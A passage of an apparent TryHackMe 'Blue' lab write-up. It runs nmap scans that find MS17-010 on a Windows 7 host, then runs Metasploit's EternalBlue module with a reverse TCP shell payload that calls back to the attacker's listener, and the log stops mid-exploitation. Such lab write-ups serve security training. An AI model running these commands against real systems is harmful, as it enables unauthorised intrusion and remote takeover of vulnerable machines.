</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.1: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:5e:37:02:b6:59 <span class="o">(</span>unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Names:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   JON-PC&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   JON-PC&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> <span class="o">(</span>Windows <span class="m">7</span> Professional 6.1<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: Jon-PC
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: JON-PC<span class="se">\x</span><span class="m">00</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2022-04-08T19:02:55-05:00
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Apr  9 02:03:09 2022 -- 1 IP address (1 host up) scanned in 88.10 seconds</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>How many ports are open with a port number under 1000?</li>
</ul>
<p>There are 3 ports open with a port number under 1000:</p>
<p><code>135, 139 and 445</code></p>
<ul>
<li>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -v --script<span class="o">=</span>vuln -o nmap/vuln <span class="nv">$IP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.92 scan initiated Sat Apr  9 02:09:41 2022 as: nmap -v --script=vuln -o nmap/vuln 10.10.14.17</span>
</span></span><span class="line"><span class="cl">Pre-scan script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span> broadcast-avahi-dos: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Discovered hosts:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     224.0.0.251
</span></span><span class="line"><span class="cl"><span class="p">|</span>   After NULL UDP avahi packet DoS <span class="o">(</span>CVE-2011-1002<span class="o">)</span>.
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Hosts are all up <span class="o">(</span>not vulnerable<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.14.17
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.034s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">991</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server
</span></span><span class="line"><span class="cl">49152/tcp open  unknown
</span></span><span class="line"><span class="cl">49153/tcp open  unknown
</span></span><span class="line"><span class="cl">49154/tcp open  unknown
</span></span><span class="line"><span class="cl">49158/tcp open  unknown
</span></span><span class="line"><span class="cl">49159/tcp open  unknown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
</span></span><span class="line"><span class="cl"><span class="p">|</span>_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
</span></span><span class="line"><span class="cl"><span class="p">|</span>_smb-vuln-ms10-054: <span class="nb">false</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-vuln-ms17-010: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   VULNERABLE:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     State: VULNERABLE
</span></span><span class="line"><span class="cl"><span class="p">|</span>     IDs:  CVE:CVE-2017-0143
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Risk factor: HIGH
</span></span><span class="line"><span class="cl"><span class="p">|</span>       A critical remote code execution vulnerability exists in Microsoft SMBv1
</span></span><span class="line"><span class="cl"><span class="p">|</span>        servers <span class="o">(</span>ms17-010<span class="o">)</span>.
</span></span><span class="line"><span class="cl"><span class="p">|</span>           
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Disclosure date: 2017-03-14
</span></span><span class="line"><span class="cl"><span class="p">|</span>     References:
</span></span><span class="line"><span class="cl"><span class="p">|</span>       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</span></span><span class="line"><span class="cl"><span class="p">|</span>       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span class="line"><span class="cl"><span class="p">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Apr  9 02:11:43 2022 -- 1 IP address (1 host up) scanned in 121.52 seconds</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The machine seems to be vulnerable to <code>ms17-010 (CVE-2017-0143)</code>, also known as
<code>EternalBlue</code></p>
<hr>
<h2 id="task-2-gain-access">Task 2: Gain Access</h2>
<h3 id="exploit-the-machine-and-gain-a-foothold">Exploit the machine and gain a foothold.</h3>
<hr>
<ul>
<li>Start Metasploit</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&hellip;&hellip;..)</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; search ms17-010 -t exploit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
</span></span><span class="line"><span class="cl"><span class="o">================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                      Disclosure Date  Rank     Check  Description</span>
</span></span><span class="line"><span class="cl">   -  ----                                      ---------------  ----     -----  -----------
</span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span class="line"><span class="cl">   <span class="m">1</span>  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span><span class="line"><span class="cl">   <span class="m">2</span>  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span class="line"><span class="cl">   <span class="m">3</span>  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</span></span></code></pre></td></tr></table>
</div>
</div><p>We found an exploit for ms17-010.</p>
<p>The exploit <code>exploit/windows/smb/ms17_010_eternalblue</code> should do the trick.</p>
<ul>
<li>Show options and set the one required value. What is the name of this value? (All caps for submission)</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; show options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/windows/smb/ms17_010_eternalblue<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name           Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----           ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   RHOSTS                          yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wik
</span></span><span class="line"><span class="cl">                                             i/Using-Metasploit
</span></span><span class="line"><span class="cl">   RPORT          <span class="m">445</span>              yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
</span></span><span class="line"><span class="cl">   SMBDomain                       no        <span class="o">(</span>Optional<span class="o">)</span> The Windows domain to use <span class="k">for</span> authentication. Only affects Wind
</span></span><span class="line"><span class="cl">                                             ows Server <span class="m">2008</span> R2, Windows 7, Windows Embedded Standard <span class="m">7</span> target machines
</span></span><span class="line"><span class="cl">                                             .
</span></span><span class="line"><span class="cl">   SMBPass                         no        <span class="o">(</span>Optional<span class="o">)</span> The password <span class="k">for</span> the specified username
</span></span><span class="line"><span class="cl">   SMBUser                         no        <span class="o">(</span>Optional<span class="o">)</span> The username to authenticate as
</span></span><span class="line"><span class="cl">   VERIFY_ARCH    <span class="nb">true</span>             yes       Check <span class="k">if</span> remote architecture matches exploit Target. Only affects Windows
</span></span><span class="line"><span class="cl">                                             Server <span class="m">2008</span> R2, Windows 7, Windows Embedded Standard <span class="m">7</span> target machines.
</span></span><span class="line"><span class="cl">   VERIFY_TARGET  <span class="nb">true</span>             yes       Check <span class="k">if</span> remote OS matches exploit Target. Only affects Windows Server <span class="m">200</span>
</span></span><span class="line"><span class="cl">                                             <span class="m">8</span> R2, Windows 7, Windows Embedded Standard <span class="m">7</span> target machines.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_tcp<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   EXITFUNC  thread           yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
</span></span><span class="line"><span class="cl">   LHOST     192.168.178.101  yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
</span></span><span class="line"><span class="cl">   LPORT     <span class="m">4444</span>             yes       The listen port
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic Target
</span></span></code></pre></td></tr></table>
</div>
</div><p>The required value we need to set is the IP address of our target machine (out victim).</p>
<p>In our case it is <code>10.10.14.17</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.14.17
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the name of the require value is <code>RHOSTS</code></p>
<ul>
<li>Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:</li>
</ul>
<p>set payload windows/x64/shell/reverse_tcp</p>
<p>Ok let&rsquo;s use this reverse tcp payload to get a shell connection via reverse tcp
from the victim.</p>
<p>One important step that THM is not telling me is that I need to set my listener ip
address to the ip of my tun0 adapter since it will not work if I am listening
on my normal wifi adapter because I am connected to a VPN.</p>
<p>So let&rsquo;s fix that!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
</span></span></code></pre></td></tr></table>
</div>
</div><p>With that set I will try to run the exploit now!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.8.33.96:4444 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445       - Host is likely VULNERABLE to MS17-010! - Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> x64 <span class="o">(</span>64-bit<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445       - Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - The target is vulnerable.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - Connecting to target <span class="k">for</span> exploitation.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - Connection established <span class="k">for</span> exploitation.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - Target OS selected valid <span class="k">for</span> OS indicated by SMB reply
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - CORE raw buffer dump <span class="o">(</span><span class="m">42</span> bytes<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - 0x00000000  <span class="m">57</span> <span class="m">69</span> 6e <span class="m">64</span> 6f <span class="m">77</span> <span class="m">73</span> <span class="m">20</span> <span class="m">37</span> <span class="m">20</span> <span class="m">50</span> <span class="m">72</span> 6f <span class="m">66</span> <span class="m">65</span> <span class="m">73</span>  Windows <span class="m">7</span> Profes
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - 0x00000010  <span class="m">73</span> <span class="m">69</span> 6f 6e <span class="m">61</span> 6c <span class="m">20</span> <span class="m">37</span> <span class="m">36</span> <span class="m">30</span> <span class="m">31</span> <span class="m">20</span> <span class="m">53</span> <span class="m">65</span> <span class="m">72</span> <span class="m">76</span>  sional <span class="m">7601</span> Serv
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - 0x00000020  <span class="m">69</span> <span class="m">63</span> <span class="m">65</span> <span class="m">20</span> <span class="m">50</span> <span class="m">61</span> <span class="m">63</span> 6b <span class="m">20</span> <span class="m">31</span>                    ice Pack <span class="m">1</span>      
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - Target arch selected valid <span class="k">for</span> arch indicated by DCE/RPC reply
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - Trying exploit with <span class="m">12</span> Groom Allocations.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - Sending all but last fragment of exploit packet
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - Starting non-paged pool grooming
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - Sending SMBv2 buffers
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - Sending final SMBv2 buffers.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - Sending last fragment of exploit packet!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.14.17:445 - Receiving response from exploit packet
